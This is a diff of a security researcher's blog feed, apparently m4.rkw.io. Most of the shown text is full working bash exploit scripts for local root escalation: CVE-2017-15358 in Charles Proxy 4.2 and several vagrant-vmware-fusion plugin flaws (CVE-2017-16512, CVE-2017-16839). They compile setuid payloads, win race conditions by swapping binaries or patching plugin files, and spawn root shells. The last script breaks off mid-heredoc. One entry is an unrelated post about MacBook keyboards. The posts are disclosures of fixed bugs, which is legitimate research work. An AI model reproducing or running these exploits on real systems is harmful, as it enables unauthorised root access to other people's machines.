 the binary and reaching the code path where root+suid is set there is enough
 time to replace the path to the binary with an alternate payload which will then
-receive the suid+root permissions instead of the Charles binary.
-
-This issue was fixed in Charles 4.2.1 released in November 2017.
-
-https://m4.rkw.io/charles_4.2.sh.txt
+receive the suid+root permissions instead of the Charles binary.</p><p>This issue was fixed in Charles 4.2.1 released in November 2017.</p><p>https://m4.rkw.io/charles_4.2.sh.txt
 2f4a2dca6563d05a201108ec6e9454e2894b603b68b3b70b8f8b043b43ee9284
 -------------------------------------------------------------------------------
-#!/bin/bash
-
-####################################################
+#!/bin/bash</p><p>####################################################
 ###### Charles 4.2 local root privesc exploit ######
 ###### by m4rkw - https://m4.rkw.io/blog.html ######
-####################################################
-
-cd
-user=&quot;`whoami`&quot;
-
-cat &gt; charles_exploit.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
+####################################################</p><p>cd
+user="`whoami`"</p><p>cat > charles_exploit.c <<EOF
+#include <unistd.h>
 int main()
 {
   setuid(0);
   seteuid(0);
-  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f \&quot;/Users/$user/Charles Proxy Settings\&quot;; /bin/bash&quot;,NULL);
+  execl("/bin/bash","bash","-c","rm -f \"/Users/$user/Charles Proxy Settings\"; /bin/bash",NULL);
   return 0;
 }
-EOF
-
-gcc -o charles_exploit charles_exploit.c
+EOF</p><p>gcc -o charles_exploit charles_exploit.c
 if [ $? -ne 0 ] ; then
-  echo &quot;failed to compile the exploit, you need xcode cli tools for this.&quot;
+  echo "failed to compile the exploit, you need xcode cli tools for this."
   exit 1
 fi
-rm -f charles_exploit.c
-
-ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
-./Charles\ Proxy\ Settings --self-repair 2&gt;/dev/null &amp;
+rm -f charles_exploit.c</p><p>ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
+./Charles\ Proxy\ Settings --self-repair 2>/dev/null &
 rm -f ./Charles\ Proxy\ Settings
-mv charles_exploit Charles\ Proxy\ Settings
-
-i=0
-
-while :
+mv charles_exploit Charles\ Proxy\ Settings</p><p>i=0</p><p>while :
 do
   r=`ls -la Charles\ Proxy\ Settings |grep root`
-  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+  if [ "$r" != "" ] ; then
     break
   fi
   sleep 0.1
   i=$((i+1))
   if [ $i -eq 10 ] ; then
     rm -f Charles\ Proxy\ Settings
-    echo &quot;Not vulnerable&quot;
+    echo "Not vulnerable"
     exit 1
   fi
-done
-
-./Charles\ Proxy\ Settings
-</pre></summary>
+done</p><p>./Charles\ Proxy\ Settings
+</p></summary>
     <title>CVE-2017-15358 Local root privesc in Charles Proxy 4.2</title>
     <updated>2018-07-30T06:41:01+00:00</updated>
     <dc:date>2018-07-30T06:41:01+00:00</dc:date>
@@ -1169,63 +691,35 @@ done
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Somebody started a petition asking Apple to recall the 2016 (and presumably
-2017 since they&#x27;re basically the same) macbook pros and fit them with a
-keyboard &quot;that works&quot;:
-
-https://www.change.org/p/apple-apple-recall-macbook-pro-w-defective-keyboard-replace-with-different-working-keyboard
-
-This is a rather absurd proposition.
-
-I have a 2016 macbook pro escape and I&#x27;m currently on my 4th topcase because of
-keyboard &quot;failures&quot; so if anyone should be calling for this it would be me.
-
-However, I strongly suspect the machine didn&#x27;t actually need a keyboard
-replacement at all. Let me explain.
-
-The first problem I had was a spongey key that wouldn&#x27;t register when pressed. I
-took it to the Apple store and one of their &quot;geniuses&quot; immediately diagnosed it
+    <summary><p>Somebody started a petition asking Apple to recall the 2016 (and presumably
+2017 since they're basically the same) macbook pros and fit them with a
+keyboard "that works":</p><p><pre>https://www.change.org/p/apple-apple-recall-macbook-pro-w-defective-keyboard-replace-with-different-working-keyboard</pre></p><p>This is a rather absurd proposition.</p><p>I have a 2016 macbook pro escape and I'm currently on my 4th topcase because of
+keyboard "failures" so if anyone should be calling for this it would be me.</p><p>However, I strongly suspect the machine didn't actually need a keyboard
+replacement at all. Let me explain.</p><p>The first problem I had was a spongey key that wouldn't register when pressed. I
+took it to the Apple store and one of their "geniuses" immediately diagnosed it
 as a keyboard failure and booked it in for repair. No air duster was tried and I
-didn&#x27;t know about air dusting at the time so I just went along with it.
-
-A total of three keyboard replacements and lots of media coverage later and now
+didn't know about air dusting at the time so I just went along with it.</p><p>A total of three keyboard replacements and lots of media coverage later and now
 I know more about this issue and have invested in a can of air duster. Apple
 also now has a support page explaining how to clean the keyboard with an air
-duster:
-
-https://support.apple.com/en-us/HT205662
-
-I&#x27;ve since had a number of similar issues with various keys that were immediately
-solved with the air duster.
-
-So I think the real issue here is that Apple&#x27;s in-store technicians were simply
-not adequately prepared for these scenarios, possibly because Apple didn&#x27;t
+duster:</p><p><pre>https://support.apple.com/en-us/HT205662</pre></p><p>I've since had a number of similar issues with various keys that were immediately
+solved with the air duster.</p><p>So I think the real issue here is that Apple's in-store technicians were simply
+not adequately prepared for these scenarios, possibly because Apple didn't
 encounter this during testing or perhaps because it happened so infrequently
-that they just didn&#x27;t think it was an issue.
-
-Although at first I wasn&#x27;t keen I now actually quite like typing on the
-butterfly keyboard and having to keep an air duster handy isn&#x27;t really much of
-an inconvenience for me.
-
-I can understand why people might try to demand that apple recall this product
-and &quot;fix the keyboard&quot; but you need only pause for a brief moment to realise
-how absurd this idea is.
-
-For a start Apple takes *years* to develop every single one of their products.
+that they just didn't think it was an issue.</p><p>Although at first I wasn't keen I now actually quite like typing on the
+butterfly keyboard and having to keep an air duster handy isn't really much of
+an inconvenience for me.</p><p>I can understand why people might try to demand that apple recall this product
+and "fix the keyboard" but you need only pause for a brief moment to realise
+how absurd this idea is.</p><p>For a start Apple takes *years* to develop every single one of their products.
 Even if they did issue a recall today it would take months at the very best
-and much more likely years for there to even be a chance of having a &quot;fixed&quot;
+and much more likely years for there to even be a chance of having a "fixed"
 keyboard. When car manufacturers issue a recall they typically have a fixed
-version of the design ready to go, that&#x27;s clearly not the case here and in my
-opinion not likely to ever be the case.
-
-Any replacement keyboard part would have to be compatible with the existing
-chassis design so it couldn&#x27;t be anything other than a low-travel keyboard.
+version of the design ready to go, that's clearly not the case here and in my
+opinion not likely to ever be the case.</p><p>Any replacement keyboard part would have to be compatible with the existing
+chassis design so it couldn't be anything other than a low-travel keyboard.
 I think the nature of a low-travel keyboard with moving keys being used in
 an environment where dust may be present is not something that even Apple
-with its mastery of hardware design can fully solve.
-
-Just get an air duster, it&#x27;s really not that big a deal.
-</pre></summary>
+with its mastery of hardware design can fully solve.</p><p>Just get an air duster, it's really not that big a deal.
+</p></summary>
     <title>2016-17 Macbook Pro keyboard recall</title>
     <updated>2018-05-04T07:38:07+00:00</updated>
     <dc:date>2018-05-04T07:38:07+00:00</dc:date>
@@ -1233,86 +727,56 @@ Just get an air duster, it&#x27;s really not that big a deal.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Another Hashicorp bug that I&#x27;ve been sitting on since late last year. This one
+    <summary><p>Another Hashicorp bug that I've been sitting on since late last year. This one
 was exploitable only during the vagrant update process, or even if the user
-typed &quot;vagrant plugin update&quot; and there was no pending update.
-
-It was possible for a rogue process on the system to subvert the upgrade process
-in a way the user was unlikely to notice in order to steal root privileges.
-
-This is now fixed.
-
-https://m4.rkw.io/vagrant_vmware_privesc_5.0.2-5.0.4.sh.txt
+typed "vagrant plugin update" and there was no pending update.</p><p>It was possible for a rogue process on the system to subvert the upgrade process
+in a way the user was unlikely to notice in order to steal root privileges.</p><p>This is now fixed.</p><p>https://m4.rkw.io/vagrant_vmware_privesc_5.0.2-5.0.4.sh.txt
 3efa119a3f20c852ffe64ec2d3dd81ef1186560aaf1b847b1d573e062195202f
 --------------------------------------------------------------------------------
 #!/bin/bash
-echo &quot;##############################################&quot;
-echo &quot;vagrant_vmware_fusion 5.0.2-5.0.4 root privesc&quot;
-echo &quot;by m4rkw&quot;
-echo &quot;##############################################&quot;
-echo
-
-ruby_version=`ls ~/.vagrant.d/gems/ |xargs`
-plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &#x27;-&#x27; -f4`
-
-echo &quot;compiling...&quot;
-
-cat &gt; vvf.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
+echo "##############################################"
+echo "vagrant_vmware_fusion 5.0.2-5.0.4 root privesc"
+echo "by m4rkw"
+echo "##############################################"
+echo</p><p>ruby_version=`ls ~/.vagrant.d/gems/ |xargs`
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d '-' -f4`</p><p>echo "compiling..."</p><p>cat > vvf.c <<EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
 int main(int ac, char *av[])
 {
   setuid(0);
   seteuid(0);
-  if (ac &gt; 1) {
-    system(&quot;mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 /tmp/vvf_exp&quot;);
-    system(&quot;chown root:wheel /tmp/vvf_exp&quot;);
-    system(&quot;chmod 4755 /tmp/vvf_exp&quot;);
-    system(&quot;mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64.orig $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64&quot;);
-    system(&quot;$HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 install\012&quot;);
+  if (ac > 1) {
+    system("mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 /tmp/vvf_exp");
+    system("chown root:wheel /tmp/vvf_exp");
+    system("chmod 4755 /tmp/vvf_exp");
+    system("mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64.orig $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64");
+    system("$HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 install\012");
     return 0;
   }
-  system(&quot;rm -f /tmp/vvf_exp&quot;);
-  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,NULL);
+  system("rm -f /tmp/vvf_exp");
+  execl("/bin/bash","bash",NULL);
   return 0;
 }
-EOF
-
-gcc -o /tmp/vvf_exp vvf.c
-rm -f vvf.c
-
-echo &quot;waiting for user to initiate vagrant plugin update...&quot;
-
-while :
+EOF</p><p>gcc -o /tmp/vvf_exp vvf.c
+rm -f vvf.c</p><p>echo "waiting for user to initiate vagrant plugin update..."</p><p>while :
 do
-  r=`ps auxwww |grep &#x27;/usr/bin/sudo&#x27; |grep &#x27;vagrant-vmware-installer_darwin_amd64 install&#x27; |grep -v grep`
-  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+  r=`ps auxwww |grep '/usr/bin/sudo' |grep 'vagrant-vmware-installer_darwin_amd64 install' |grep -v grep`
+  if [ "$r" != "" ] ; then
     break
   fi
-done
-
-pid=`ps auxww |grep &#x27;./vagrant-vmware-installer_darwin_amd64 install&#x27; |grep -v grep |xargs -L1 |cut -d &#x27; &#x27; -f2`
-
-cd $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop
-
-echo &quot;dropping payload in place of installer binary...&quot;
-
-mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
-mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64
-
-echo &quot;waiting for payload to trigger...&quot;
-
-while :
+done</p><p>pid=`ps auxww |grep './vagrant-vmware-installer_darwin_amd64 install' |grep -v grep |xargs -L1 |cut -d ' ' -f2`</p><p>cd $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop</p><p>echo "dropping payload in place of installer binary..."</p><p>mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
+mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64</p><p>echo "waiting for payload to trigger..."</p><p>while :
 do
-  r=`ls -la /tmp/vvf_exp 2&gt;/dev/null |grep -- &#x27;-rwsr-xr-x&#x27; |grep root`
-  if [ &quot;$r&quot; != &quot;&quot; ] ; then
-    echo &quot;spawning shell...&quot;
+  r=`ls -la /tmp/vvf_exp 2>/dev/null |grep -- '-rwsr-xr-x' |grep root`
+  if [ "$r" != "" ] ; then
+    echo "spawning shell..."
     /tmp/vvf_exp
     exit 0
   fi
 done
-</pre></summary>
+</p></summary>
     <title>CVE-2017-16512 Hashicorp vagrant-vmware-fusion v5.0.2-5.0.4 local root</title>
     <updated>2018-03-28T21:08:28+00:00</updated>
     <dc:date>2018-03-28T21:08:28+00:00</dc:date>
@@ -1320,187 +784,115 @@ done
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Another exploit for the now deprecated vagrant-vmware-fusion plugin. This one
+    <summary><p>Another exploit for the now deprecated vagrant-vmware-fusion plugin. This one
 only works if VMware Fusion is not installed which is an unlikely scenario.
-However if this should occur then it&#x27;s an easy root escalation so users should
-still update.
-
-https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt
+However if this should occur then it's an easy root escalation so users should
+still update.</p><p>https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt
 92d193047970f90f18913cb8a1fe3b326c750dc68a2bc54be6b16e0d899c294a
 ------------------------------------------------------------------------------
 #!/bin/bash
 echo
-echo &quot;#########################################################&quot;
-echo &quot;# vagrant_vmware_fusion plugin 5.0.4 local root privesc #&quot;
-echo &quot;# by m4rkw - https://m4.rkw.io/blog.html                #&quot;
-echo &quot;#########################################################&quot;
-echo &quot;# Note: only works when VMWare Fusion is not installed. #&quot;
-echo &quot;#########################################################&quot;
-echo
-
-cleanup() {
-  exec 2&gt; /dev/null
-  killall -9 vagrant 1&gt;/dev/null 2&gt;/dev/null
-  kill -9 `ps auxwww |egrep &#x27;\/vagrant up$&#x27; |xargs -L1 |cut -d &#x27; &#x27; -f2` &amp;&gt;/dev/null
-  exec 2&gt; /dev/tty
+echo "#########################################################"
+echo "# vagrant_vmware_fusion plugin 5.0.4 local root privesc #"
+echo "# by m4rkw - https://m4.rkw.io/blog.html                #"
+echo "#########################################################"
+echo "# Note: only works when VMWare Fusion is not installed. #"
+echo "#########################################################"
+echo</p><p>cleanup() {
+  exec 2> /dev/null
+  killall -9 vagrant 1>/dev/null 2>/dev/null
+  kill -9 `ps auxwww |egrep '\/vagrant up$' |xargs -L1 |cut -d ' ' -f2` &>/dev/null
+  exec 2> /dev/tty
   cd
   rm -rf .vagrant_vmware_fusion_504_exp
   rm -rf /Applications/VMware\ Fusion.app
   mv -f ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb
-}
-
-if [ -e &quot;/Applications/VMware Fusion.app&quot; ] ; then
-  echo &quot;Fusion is installed, not exploitable.&quot;
+}</p><p>if [ -e "/Applications/VMware Fusion.app" ] ; then
+  echo "Fusion is installed, not exploitable."
   exit 1
-fi
-
-echo &quot;setting up fake app directory...&quot;
-
-mkdir /Applications/VMware\ Fusion.app
+fi</p><p>echo "setting up fake app directory..."</p><p>mkdir /Applications/VMware\ Fusion.app
 if [ ! $? -eq 0 ] ; then
-  echo &quot;Failed to create /Applications/VMware Fusion.app.&quot;
+  echo "Failed to create /Applications/VMware Fusion.app."
   exit 1
-fi
-
-mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
-
-touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+fi</p><p>mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services</p><p>touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
 touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
 chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
-
-cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &lt;&lt;EOF
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services</p><p>cat > /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx <<EOF
 #!/bin/bash
-echo 1&gt;&amp;2
-echo &quot;VMware Fusion Information:&quot; 1&gt;&amp;2
-echo &quot;VMware Fusion 10.0.1 build-6754183 Release&quot; 1&gt;&amp;2
+echo 1>&2
+echo "VMware Fusion Information:" 1>&2
+echo "VMware Fusion 10.0.1 build-6754183 Release" 1>&2
 echo
-EOF
-
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
-
-cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack &lt;&lt;EOF
+EOF</p><p>chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx</p><p>cat > /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack <<EOF
 #!/bin/bash
 chown root:wheel /tmp/vvp_504
 chmod 4755 /tmp/vvp_504
-EOF
-
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack
-
-echo &quot;compiling payload...&quot;
-
-cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
+EOF</p><p>chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack</p><p>echo "compiling payload..."</p><p>cat > /tmp/vvp_504.c <<EOF
+#include <unistd.h>
 int main()
 {
   setuid(0);
   seteuid(0);
-  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/vvp_504; /bin/bash&quot;,NULL);
+  execl("/bin/bash","bash","-c","rm -f /tmp/vvp_504; /bin/bash",NULL);
   return 0;
 }
 EOF
 gcc -o /tmp/vvp_504 /tmp/vvp_504.c
-rm -f /tmp/vvp_504.c
-
-cd
+rm -f /tmp/vvp_504.c</p><p>cd
 mkdir .vagrant_vmware_fusion_504_exp
-cd .vagrant_vmware_fusion_504_exp
-
-echo &quot;writing dummy vagrantfile ...&quot;
-
-cat &gt; vagrantfile &lt;&lt;EOF
-Vagrant.configure(&#x27;2&#x27;) do |config|
-  config.vm.box = &#x27;envimation/ubuntu-xenial&#x27;
+cd .vagrant_vmware_fusion_504_exp</p><p>echo "writing dummy vagrantfile ..."</p><p>cat > vagrantfile <<EOF
+Vagrant.configure('2') do |config|
+  config.vm.box = 'envimation/ubuntu-xenial'
 end
-EOF
-
-echo &quot;patching driver.rb...&quot;
-
-if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+EOF</p><p>echo "patching driver.rb..."</p><p>if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
   mv ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig
-fi
-
-cat &gt; ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
-load File.dirname(__FILE__) + &quot;/driver.rb.orig&quot;
-
-Dir.chdir(&quot;/Applications/VMware Fusion.app/Contents/Library/&quot;)
-
-\`ln -sf /bin/ls vmnet-cli\`
-
-Thread.new do
-  system(&quot;/Users/#{ENV[&quot;USER&quot;]}/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&quot;)
-end
-
-sleep 1.0/ENV[&quot;DELAY&quot;].to_f
-
-\`ln -sf vmnet-cli.hack vmnet-cli\`
-
-exit 0
-EOF
-
-echo
-echo &quot;attempting to exploit the race condition...&quot;
-echo &quot;(the more loaded the system the longer this will take)&quot;
-echo
-
-echo -n &quot;racing: &quot;
-
-success=0
+fi</p><p>cat > ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb <<EOF
+load File.dirname(__FILE__) + "/driver.rb.orig"</p><p>Dir.chdir("/Applications/VMware Fusion.app/Contents/Library/")</p><p>\`ln -sf /bin/ls vmnet-cli\`</p><p>Thread.new do
+  system("/Users/#{ENV["USER"]}/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status")
+end</p><p>sleep 1.0/ENV["DELAY"].to_f</p><p>\`ln -sf vmnet-cli.hack vmnet-cli\`</p><p>exit 0
+EOF</p><p>echo
+echo "attempting to exploit the race condition..."
+echo "(the more loaded the system the longer this will take)"
+echo</p><p>echo -n "racing: "</p><p>success=0
 i=0
 delay=80
 previous_dir=0
 gap=5
-max_attempts=250
-
-while :
+max_attempts=250</p><p>while :
 do
-  export DELAY=&quot;$delay&quot;
-  printf &quot;%x&quot; $DELAY
-
-  x=`vagrant up 2&gt;&amp;1`
-
-  if [ &quot;`echo &quot;$x&quot; |grep &#x27;illegal option&#x27;`&quot; != &quot;&quot; ] ; then
+  export DELAY="$delay"
+  printf "%x" $DELAY</p><p>  x=`vagrant up 2>&1`</p><p>  if [ "`echo "$x" |grep 'illegal option'`" != "" ] ; then
     if [ $previous_dir -eq 2 -a $gap -gt 1 ] ; then
       gap=$((gap-1))
     fi
     delay=$((delay+$gap))
     previous_dir=1
-  elif [ &quot;`echo &quot;$x&quot; |grep &#x27;detected invalid ownership&#x27;`&quot; != &quot;&quot; ] ; then
+  elif [ "`echo "$x" |grep 'detected invalid ownership'`" != "" ] ; then
     if [ $previous_dir -eq 1 -a $gap -gt 1 ] ; then
       gap=$((gap-1))
     fi
     delay=$((delay-$gap))
     previous_dir=2
   else
-    r=`ls -la /tmp/vvp_504 |grep -- &#x27;-rwsr-xr-x  1 root  wheel&#x27;`
-    if [ &quot;$r&quot; != &quot;&quot; ] ; then
+    r=`ls -la /tmp/vvp_504 |grep -- '-rwsr-xr-x  1 root  wheel'`
+    if [ "$r" != "" ] ; then
       success=1
       break
     fi
-  fi
-
-  i=$((i+1))
-
-  if [ $i -eq $max_attempts ] ; then
+  fi</p><p>  i=$((i+1))</p><p>  if [ $i -eq $max_attempts ] ; then
     break
   fi
-done
-
-cleanup
-
-if [ ! $success -eq 1 ] ; then
+done</p><p>cleanup</p><p>if [ ! $success -eq 1 ] ; then
   echo
   echo
-  echo &quot;exploit failed.&quot;
+  echo "exploit failed."
   exit 1
-fi
-
+fi</p><p>echo
 echo
-echo
-echo &quot;SUCCESS!&quot;
+echo "SUCCESS!"
 cd
 /tmp/vvp_504
-</pre></summary>
+</p></summary>
     <title>CVE-2017-16839 Hashicorp vagrant-vmware-fusion v5.0.4 local root</title>
     <updated>2018-03-28T21:03:02+00:00</updated>
     <dc:date>2018-03-28T21:03:02+00:00</dc:date>
@@ -1508,109 +900,71 @@ cd
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>This issue was reported to Hashicorp on 16/11/17. At first they claimed it was
+    <summary><p>This issue was reported to Hashicorp on 16/11/17. At first they claimed it was
 low priority because it required local access, despite being a straight-to-root
-escalation. Then they conceded that this wasn&#x27;t reasonable and said it was high
-priority and that they would address it.
-
-It has taken until this week to get their fixes out, involving an entire rewrite
+escalation. Then they conceded that this wasn't reasonable and said it was high
+priority and that they would address it.</p><p>It has taken until this week to get their fixes out, involving an entire rewrite
 of the vagrant plugin architecture in order to make it secure. However the issue
 could have been patched much quicker as it was a simple system() execution
-without path scrubbing.
-
-So now there is a new unified plugin - vagrant-vmware-desktop - which is meant
+without path scrubbing.</p><p>So now there is a new unified plugin - vagrant-vmware-desktop - which is meant
 to be more secure. Unfortunately their initial attempt failed to remove the old
 plugin from the system, even if you explicitly uninstall it, leaving it
-vulnerable.
-
-As of 07:22 on 28/03/18 there is one new update of the new
+vulnerable.</p><p>As of 07:22 on 28/03/18 there is one new update of the new
 vmware-vagrant-desktop plugin - version 1.0.1 - which also still does not seem
-to cause the old plugin to be removed. Hopefully this will be addressed soon.
-
-Right now though I guess you could call this 0day since the two releases that
-were meant to fix it apparently don&#x27;t work unless you follow the update notes
-and manually remove the old plugin.
-
----- update 28/03/18 20:56 ----
-
-Turns out the issue is fixed, it just doesn&#x27;t do the cleanup of the old plugin
+to cause the old plugin to be removed. Hopefully this will be addressed soon.</p><p>Right now though I guess you could call this 0day since the two releases that
+were meant to fix it apparently don't work unless you follow the update notes
+and manually remove the old plugin.</p><p>---- update 28/03/18 20:56 ----</p><p>Turns out the issue is fixed, it just doesn't do the cleanup of the old plugin
 until you execute vagrant. Seems odd not to do this during the installation
-process but oh well, at least it works.
-
-https://m4.rkw.io/vagrant_vmware_privesc_4.0.25-5.0.4.sh.txt
+process but oh well, at least it works.</p><p>https://m4.rkw.io/vagrant_vmware_privesc_4.0.25-5.0.4.sh.txt
 f8fbea90f70e978a8178d45930fff05477e2836204d9d81b6ddad73a338cfb66
 --------------------------------------------------------------------------------
 #!/bin/bash
 echo
-echo &quot;################################################################&quot;
-echo &quot;# vagrant_vmware_fusion plugin 4.0.25-5.0.4 local root privesc #&quot;
-echo &quot;# by m4rkw - https://m4.rkw.io/blog.html                       #&quot;
-echo &quot;################################################################&quot;
-echo
-
-cleanup() {
+echo "################################################################"
+echo "# vagrant_vmware_fusion plugin 4.0.25-5.0.4 local root privesc #"
+echo "# by m4rkw - https://m4.rkw.io/blog.html                       #"
+echo "################################################################"
+echo</p><p>cleanup() {
   rm -rf ~/.vagrant_vmware_fusion_504_exp
   mv -f ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb
-}
-
-gem_version=&quot;2.4.2&quot;
-plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &#x27;-&#x27; -f4 |tail -n1`
-
-cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
+}</p><p>gem_version="2.4.2"
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d '-' -f4 |tail -n1`</p><p>cat > /tmp/vvp_504.c <<EOF
+#include <unistd.h>
 int main()
 {
   setuid(0);
   seteuid(0);
-  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/vvp_504; /bin/bash&quot;,NULL);
+  execl("/bin/bash","bash","-c","rm -f /tmp/vvp_504; /bin/bash",NULL);
   return 0;
 }
 EOF
 gcc -o /tmp/vvp_504 /tmp/vvp_504.c
-rm -f /tmp/vvp_504.c
-
-cd
+rm -f /tmp/vvp_504.c</p><p>cd
 mkdir .vagrant_vmware_fusion_504_exp
-cd .vagrant_vmware_fusion_504_exp
-
-if [ ! -e ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+cd .vagrant_vmware_fusion_504_exp</p><p>if [ ! -e ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
   mv ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb.orig
-fi
-
-cat &gt; ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
